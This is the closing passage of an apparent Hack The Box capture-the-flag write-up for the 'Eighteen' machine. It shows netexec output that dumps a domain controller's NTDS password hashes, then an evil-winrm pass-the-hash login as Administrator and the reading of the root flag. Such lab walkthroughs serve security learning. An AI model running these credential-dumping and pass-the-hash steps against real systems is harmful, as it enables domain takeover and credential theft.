<SNIP>
SMB         dc01.eighteen.htb 445    DC01             [+] Dumped 13 NTDS hashes to /home/kali/.nxc/logs/ntds/dc01.eighteen.htb_None_2025-11-17_164548.ntds of which 11 were added to the database
SMB         dc01.eighteen.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.eighteen.htb 445    DC01             [*] cat /home/kali/.nxc/logs/ntds/dc01.eighteen.htb_None_2025-11-17_164548.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.eighteen.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc01.eighteen.htb_None_2025-11-17_164548.ntds | cut -d ':' -f1
```

Got all the hashes. <br>
&rarr; Let's access to `Administrator`.

```bash
└─$ evil-winrm -i dc01.eighteen.htb -u Administrator -H 0b133be956bfaddf9cea56xxxxxxxxxx
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

There we go!

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/17/2025   8:08 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a73eaaxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Got our `root.txt` flag.

![result](/assets/img/eighteen-htb-season9/result.png)